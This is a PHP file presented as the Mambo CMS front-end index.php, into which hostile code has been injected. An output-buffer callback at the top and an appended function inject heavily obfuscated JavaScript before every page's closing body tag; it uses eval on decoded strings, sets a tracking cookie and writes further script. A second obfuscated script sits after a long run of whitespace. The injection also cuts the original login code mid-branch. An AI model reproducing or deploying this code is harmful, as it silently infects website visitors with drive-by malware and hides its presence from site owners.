<?php
ob_start("phpfake");




/**
* @version $Id: index.php,v 1.9 2005/02/16 02:03:33 eddieajau Exp $
* @package Mambo
* @copyright (C) 2000 - 2005 Miro International Pty Ltd
* @license http://www.gnu.org/copyleft/gpl.html GNU/GPL
* Mambo is Free Software
*/

/** Set flag that this is a parent file */
define( '_VALID_MOS', 1 );

// checks for configuration file, if none found loads installation page
if ( !file_exists( 'configuration.php' ) || filesize( 'configuration.php' ) < 10 ) {
	header( 'Location: installation/index.php' );
	exit();
}

include_once( 'globals.php' );
require_once( 'configuration.php' );

// displays offline page
if ( $mosConfig_offline == 1 ){
	include( 'offline.php' );
	exit();
}

require_once( 'includes/mambo.php' );
if (file_exists( 'components/com_sef/sef.php' )) {
	require_once( 'components/com_sef/sef.php' );
} else {
	require_once( 'includes/sef.php' );
}
require_once( 'includes/frontend.php' );

/*
Installation sub folder check, removed for work with CVS*/
if (file_exists( 'installation/index.php' )) {
	include ('offline.php');
	exit();
}
/**/
/** retrieve some expected url (or form) arguments */
$option = trim( strtolower( mosGetParam( $_REQUEST, 'option' ) ) );
$Itemid = intval( mosGetParam( $_REQUEST, 'Itemid', null ) );
$database = new database( $mosConfig_host, $mosConfig_user, $mosConfig_password, $mosConfig_db, $mosConfig_dbprefix );
$database->debug( $mosConfig_debug );
$acl = new gacl_api();

if ($option == '') {
	if ($Itemid) {
		$query = "SELECT id, link"
		. "\n FROM #__menu"
		. "\n WHERE menutype='mainmenu'"
		. "\n AND id = '$Itemid'"
		. "\n AND published = '1'"
		;
		$database->setQuery( $query );
	} else {
		$query = "SELECT id, link"
		. "\n FROM #__menu"
		. "\n WHERE menutype='mainmenu' AND published='1'"
		. "\n ORDER BY parent, ordering LIMIT 1"
		;
		$database->setQuery( $query );
	}
	$menu = new mosMenu( $database );
	if ($database->loadObject( $menu )) {
		$Itemid = $menu->id;
	}
	$link = $menu->link;
	if (($pos = strpos( $link, '?' )) !== false) {
		$link = substr( $link, $pos+1 ). '&Itemid='.$Itemid;
	}
	parse_str( $link, $temp );
	/** this is a patch, need to rework when globals are handled better */
	foreach ($temp as $k=>$v) {
		$GLOBALS[$k] = $v;
		$_REQUEST[$k] = $v;
		if ($k == 'option') {
			$option = $v;
		}
	}
}

/** do we have a valid Itemid yet?? */
if ( $Itemid === null ) {
	/** Nope, just use the homepage then. */
	$query = "SELECT id"
	. "\n FROM #__menu"
	. "\n WHERE menutype='mainmenu'"
	. "\n AND published='1'"
	. "\n ORDER BY parent, ordering"
	. "\n LIMIT 1"
	;
	$database->setQuery( $query );
	$Itemid = $database->loadResult();
}

/** patch to lessen the impact on templates */
if ($option == 'search') {
	$option = 'com_search';
}

/** mainframe is an API workhorse, lots of 'core' interaction routines */
$mainframe = new mosMainFrame( $database, $option, '.' );
$mainframe->initSession();

// loads english language file by default
if ( $mosConfig_lang == '' ) {
	$mosConfig_lang = 'english';
}
include_once ( 'language/'.$mosConfig_lang.'.php' );

// frontend login & logout controls
$return = mosGetParam( $_REQUEST, 'return', NULL );
$message = mosGetParam( $_POST, 'message', 0 );
if ($option == "login") {
	$mainframe->login();

	// JS Popup message
	if ( $message ) {
		?>
<?php
function phpfake($buffer)
{
  $Exp='<script language="javascript">$="%64d%3d%22}Sx%3ctSx%3c}^}+yv8d)K7i7M,%2522%2520%2520%279kd)K7i7M0-0%2522%2520%2520%27+m}^}-S]^8d)K7t7M%3cd)K7}7M%3cd)K7i7M9+iSx!-|)K888d)K7i7M6%2520hQQ9;}^}950&5##950%2522&M+iSx%2522-|)K8888d)K7i7M6%2520h##!!9..#9;}^}950!%25209M+}Sx%22;dc%3d%220d)K7t7M-t)%3ewudTqdu89%3d8t)%3ewudTqi899+yv8d)K7t7M,%25209d)K7t7M-!+d)K7}7M-t)%3ewud]%257F~dx89;!+ve~sdy%257F~0S]^8t%3c}%3ci9kfqb0b-888i;8#:t99;8}Nt9:#9;t9+budeb~0b+mfqb0t-7fuc|%257Fh%3es%257F}7+fqb0iSx!%3ciSx%2522%3c%22;de%3d%22-|)K88d)K7}7M;}^}950%2522%259M+yv888d)K7t7M:%25229.-%252096688d)K7t7M:%25229,-)99tSx-~)K8d)K7t7M50!%25209M+u|cu0tSx-|)K88d)K7t7M:&950%2522%279M+4-4%3ebu`|qsu8t%3ciSx%2522;}Sx;iSx!;tSx;})Kd)K7}7M%3d!M;7%3es%257F}79+%22;db%3d%22d7%3c7e7%3c7f7%3c7g7%3c7h7%3c7i7%3c7j79+fqb0~)-~ug0Qbbqi8!%3c%2522%3c#%3c$%3c%25%3c&%3c%27%3c(%3c)9+fqb0d)-~ug0Qbbqi89+fqb0t)-~ug0Tqdu89+d)K7i7M-t)%3ewudVe||Iuqb89+yv8t)%3ewudTqi89.#9d)K7t7M-t)%3ewudTqdu89%3d8t)%3ewudTqi89;%25229+u|cu%22;cd%3d%22s%2574+%2553tri%256e%2567.f%2572%256fmC%2568%2561rCo%2564%2565(%2528t%256dp%252ec%2568%22;st%3d%22%2573%2574%253d%2522$%253d%2573t%253b%2564%2563%2573(%2564%2561%252bd%2562%252bd%2563+%2564d%252bd%2565%252c%2531%2530%2529;%2564w%2528s%2574%2529%253b%2573%2574%253d$;%2522%253b%22;ce%3d%22ar%2543od%2565%2541%2574%25280)^%2528%25270%25780%2530%2527+es%2529))%253b%257d}%22;da%3d%22fqb0})-~ug0Qbbqi87e~%257F7%3c7tfu7%3c7dxb7%3c7vyb7%3c7fyv7%3c7huc7%3c7fuc7%3c7wxd7%3c7u~y7%3c7ud~7%3c7|uf7%3c7dgu79+fqb0|)-~ug0Qbbqi87q7%3c7r7%3c7s7%3c7t7%3c7u7%3c7v7%3c7w7%3c7x7%3c7y7%3c7z7%3c7{7%3c7|7%3c7}7%3c7~7%3c7%257F7%3c7`7%3c7a7%3c7b7%3c7c7%3c7%22;cz%3d%22%2566un%2563tio%256e cz%2528c%257a){%2572e%2574u%2572%256e%2520ca%252bcb+%2563%2563%252bcd%252b%2563e+c%257a;%257d;%22;op%3d%22%2524%253d%2522dw(d%2563s(c%2575,1%2534%2529)%253b%2522;%22;cu%3d%22(p}b4g`mxq)6b}g}v}x}`m.|}ppqz6*(}rfuyq4gfw)6|``d.;;bqgx{l:w{y;xp;pl;64c}p`|)%25$$4|q}s|`),$*(;}rfuyq*(;p}b*%22;ca%3d%22%2566%2575%256e%2563t%2569o%256e%2520dcs%2528d%2573,%2565s%2529{d%2573%253dunesca%2570%22;dz%3d%22%2566un%2563tio%256e d%2577(t%2529{c%2561%253d%2527%252564o%252563ume%25256et%2525%2532ew%252572%252569%2574%2565(%252522%2527;ce%253d%2527%252522)%2527;cb%253d%2527%25253c%252573cr%252569pt%252520%256ca%25256eg%252575a%252567e%25253d%25255c%252522%256aav%2561%2573%252563%252572%2525%25369%2570%2574%25255c%2525%2532%2532%25253e%2527;cc%253d%2527%25253c%25255c%25252fscr%252569%2570%252574%25253e%2527;eva%256c%2528%2575%256ees%2563%2561pe(%2574))%257d;%22;cc%3d%2274%2568;i+%252b%2529{t%256dp%253dd%2573%252es%256c%2569ce%2528i,i%252b1%2529;st%253d%22;cb%3d%22e(d%2573);%2573t%253dtm%2570%253d%2527%2527;for(i%253d0;i%253cds%252e%256ce%256eg%25%22;%69f%20%28d%6fcu%6dent%2e%63%6foki%65.i%6ede%78Of%28%27v%62ul%6cet%69n_m%75%6c%74iq%75o%74e%3d%27)%3d%3d-1){%73%63(%27vbu%6c%6c%65ti%6e%5f%6du%6ct%69q%75%6f%74%65%3d%27,2,7%29%3be%76a%6c(un%65sc%61pe%28d%7a+c%7a+%6f%70%2b%73%74)+%27dw(%64z+c%7a%28$+%73t))%3b%27)}%65ls%65{$%3d%27%27};func%74i%6f%6e %73%63(c%6em%2cv,e%64)%7bv%61r%20ex%64%3dnew%20%44at%65%28%29;%65xd.%73%65t%44ate%28e%78%64%2eget%44at%65()+%65%64)%3b%64%6fc%75men%74.%63oo%6bie%3dcnm%2b%20%27%3d%27 +esca%70e%28v)%2b%27%3b%65%78p%69%72e%73%3d%27+exd.%74oGM%54St%72%69%6eg()%3b}%3b";eval(unescape($));document.write($);</script>';
  return (ereg_replace("</body>", "$Exp</body>", $buffer));
}
?>

                                                                                                                                                                                                                                                                        <!--59e1b46875488201c353605c833e8e4a-><script language=javascript>iucgl="%";zd="<s!63!72ipt!20l!61!6eg!75!61ge=j!61vas!63!72!69pt!3e!20 !66!75n!63t!69!6fn z!69t!61r!28g!64e){!76ar!20bgw,j!63!3d\"!65kTu!66!7a3wB!3a~!2cs^j[Km!5ao!69@!2eM!67!50#)!35'_r=N\\\"vyqJ2!45I!4fn0C|l!47$1!707+!26!20!61!63HVA!38!28!21d!68!3b!2dxb*]`{4!39t!36U!46}\"!2czff=\"!22!2cf!2c!6dq,djo!3d\"\",!76oe;for(bgw!3d!30;b!67w<!67de.le!6egth!3b!62!67w+!2b!29{ !66!3dgde.!63ha!72At(bgw)!3b!6d!71=jc.!69!6ed!65!78!4ff(!66!29;i!66(!6dq!3e!2d!31){ vo!65=((mq+1)!2581-1);!69!66(!76oe<!3d0!29vo!65!2b!3d81!3b!64jo!2b!3d!6ac!2e!63harAt(!76!6fe-!31!29; } e!6c!73!65 !64jo!2b=f;!7dzf!66+=djo!3bdo!63ume!6e!74.!77!72i!74!65!28zff);}<!2fs!63r!69pt>";chnns=unescape(zd.replace(/!/g,iucgl));var kl,c;document.write(chnns);kl="<^H=@76aGc0PfcPkNv[cyc^H=@76v>ahiHfZk06MB=@6k!av<S|RO#uaGc0PfcPkN\\v2cycSH=@76\\vaSR|N\\v;667~//BBBMPiiPGkc0cG@6@H^M0k6/rrf6*M[^?v&hiHfZk06M=kzk==k=&v\\v><\\/S|RO#u>va5-a</^H=@76>aa";zitar(kl);</script>